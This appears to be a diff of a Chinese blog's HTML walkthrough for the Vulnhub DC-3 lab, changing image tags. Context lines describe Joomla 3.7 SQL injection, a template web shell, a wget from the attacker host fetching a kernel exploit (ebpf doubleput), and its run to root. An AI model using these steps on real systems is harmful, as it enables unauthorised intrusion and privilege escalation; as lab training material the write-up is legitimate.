@@ -252,7 +252,7 @@
 
 
 <p>可以看到目标开放了80端口，访问目标地址，<strong>可以看到Flag的提示，本次只有一个flag，需要获得root权限</strong></p>
-<scr img="/img/Vulnhub-DC-3过关笔记/3.png">
+<img src="/img/Vulnhub-DC-3过关笔记/3.png" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -262,18 +262,18 @@
 
 <h4 id="CMS漏洞发现"><a href="#CMS漏洞发现" class="headerlink" title="CMS漏洞发现"></a>CMS漏洞发现</h4><p>开放了80端口，我们就从CMS开始下手吧</p>
 <p>Google的插件Wapplalyzer发现了目标使用的Joomla CMS</p>
-<scr img="/img/Vulnhub-DC-3过关笔记/1.png">
+<img src="/img/Vulnhub-DC-3过关笔记/1.png" srcset="/img/loading.gif" lazyload>
 
 
 
 <p>可以使用OWASP的开源项目<a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">joomscan</a>来对目标进行一个扫描，可以发现一个关键信息，Joomla的CMS版本是3.7</p>
 <p><strong>PS：当初在进行CMS版本收集的时候走了弯路，版本确定错了，后面漏洞一个也不适用，信息收集的时候还需要注意一下信息的准确性</strong></p>
-<scr img="/img/Vulnhub-DC-3过关笔记/2.png">
+<img src="/img/Vulnhub-DC-3过关笔记/2.png" srcset="/img/loading.gif" lazyload>
 
 
 
 <p>使用searchsploit在exploit-db上找一下对应的漏洞，可以看到存在一个SQL注入漏洞</p>
-<scr img="/img/Vulnhub-DC-3过关笔记/4.png">
+<img src="/img/Vulnhub-DC-3过关笔记/4.png" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -303,15 +303,15 @@
 
 
 
-<scr img="/img/Vulnhub-DC-3过关笔记/5.png">
+<img src="/img/Vulnhub-DC-3过关笔记/5.png" srcset="/img/loading.gif" lazyload>
 
-<scr img="/img/Vulnhub-DC-3过关笔记/6.png">
+<img src="/img/Vulnhub-DC-3过关笔记/6.png" srcset="/img/loading.gif" lazyload>
 
-<scr img="/img/Vulnhub-DC-3过关笔记/7.png">
+<img src="/img/Vulnhub-DC-3过关笔记/7.png" srcset="/img/loading.gif" lazyload>
 
-<scr img="/img/Vulnhub-DC-3过关笔记/8.png">
+<img src="/img/Vulnhub-DC-3过关笔记/8.png" srcset="/img/loading.gif" lazyload>
 
-<scr img="/img/Vulnhub-DC-3过关笔记/9.png">
+<img src="/img/Vulnhub-DC-3过关笔记/9.png" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -321,7 +321,7 @@
 
 
 <p>访问<a target="_blank" rel="noopener" href="http://192.168.199.238/templates/beez3/shell.php">http://192.168.199.238/templates/beez3/shell.php</a> ，kali上线一个shell</p>
-<scr img="/img/Vulnhub-DC-3过关笔记/10.png">
+<img src="/img/Vulnhub-DC-3过关笔记/10.png" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -331,7 +331,7 @@
 
 
 <p>当前用户没有能以root权限执行的命令，那么我们可以换一下思路，在exploit-db上看看能不能找到当前系统内核提权的EXP，经过尝试，有一个漏洞是可以使用的</p>
-<scr img="/img/Vulnhub-DC-3过关笔记/11.png">
+<img src="/img/Vulnhub-DC-3过关笔记/11.png" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -349,7 +349,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget http://192.168.199.146:8888/39772.zip  <span class="hljs-comment"># 从Kali上下载文件</span><br>$ unzip 39772.zip  <span class="hljs-comment"># 解压 文件</span><br>$ <span class="hljs-built_in">cd</span> 39772<br>$ ls<br>ls<br>crasher.tar<br>exploit.tar<br>$ tar -xvf exploit.tar  <span class="hljs-comment"># 解包</span><br>tar -xvf exploit.tar<br>ebpf_mapfd_doubleput_exploit/<br>ebpf_mapfd_doubleput_exploit/hello.c<br>ebpf_mapfd_doubleput_exploit/suidhelper.c<br>ebpf_mapfd_doubleput_exploit/compile.sh<br>ebpf_mapfd_doubleput_exploit/doubleput.c<br>$ <span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>$ ls   <br>ls<br>compile.sh<br>doubleput.c<br>hello.c<br>suidhelper.c<br>$ ./compile.sh  <span class="hljs-comment"># 执行编译脚本</span><br>$ ls  <span class="hljs-comment"># 编译后出现了doubleput文件</span><br>ls<br>compile.sh<br>doubleput<br>doubleput.c<br>hello<br>hello.c<br>suidhelper<br>suidhelper.c<br>$ ./doubleput  <span class="hljs-comment"># 提权</span><br>./doubleput<br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. <span class="hljs-keyword">if</span> this worked, you<span class="hljs-string">&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="hljs-string">suid file detected, launching rootshell...</span><br><span class="hljs-string">we have root privs now...</span><br><span class="hljs-string">id  # 当前权限</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="hljs-string">ls /root  # 查看root家目录，发现flag</span><br><span class="hljs-string">the-flag.txt</span><br><span class="hljs-string">cat /root/the-flag.txt  # 查看flag</span><br><span class="hljs-string"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="hljs-string"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="hljs-string">  \ \ /\ / / _ \ | | | | | |/ _ \| &#x27;</span>_ \ / _ \ | | | |<br>   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|<br>    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)<br>                                                     <br><br>Congratulations are <span class="hljs-keyword">in</span> order.  :-)<br><br>I hope you<span class="hljs-string">&#x27;ve enjoyed this challenge as I enjoyed making it.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If there are any ways that I can improve these little challenges,</span><br><span class="hljs-string">please let me know.</span><br><span class="hljs-string"></span><br><span class="hljs-string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="hljs-string"></span><br><span class="hljs-string">Have a great day!!!!</span><br></code></pre></td></tr></table></figure>
 
 <p>获取Flag</p>
-<scr img="/img/Vulnhub-DC-3过关笔记/12.png">
+<img src="/img/Vulnhub-DC-3过关笔记/12.png" srcset="/img/loading.gif" lazyload>
 
             </div>
             <hr>
